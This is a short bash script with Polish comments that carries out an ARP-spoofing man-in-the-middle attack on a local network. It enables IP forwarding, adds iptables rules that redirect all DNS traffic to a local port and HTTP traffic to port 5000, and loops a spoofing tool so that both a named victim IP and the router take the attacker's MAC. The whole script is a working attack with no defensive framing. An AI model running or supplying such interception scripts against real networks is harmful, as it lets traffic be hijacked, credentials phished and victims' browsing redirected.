#!/bin/bash

# --- włącz forwarding IP ---
sysctl -w net.ipv4.ip_forward=1

# --- przekieruj wszystkie UDP/TCP:53 na lokalny port 53 ---
#iptables -t nat -C PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53 2>/dev/null || \
iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53
#iptables -t nat -C PREROUTING -p tcp --dport 53 -j REDIRECT --to-port 53 2>/dev/null || \
iptables -t nat -A PREROUTING -p tcp --dport 53 -j REDIRECT --to-port 53

sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 5000

while true; do
  # mówimy ofierze: "router (192.168.138.231) to mój MAC"
  sudo ./arprep wlp2s0 192.168.138.231 192.168.138.213
  # mówimy routerowi: "ofiara (192.168.138.213) to mój MAC"
  sudo ./arprep wlp2s0 192.168.138.213 192.168.138.231
  sleep 1
done
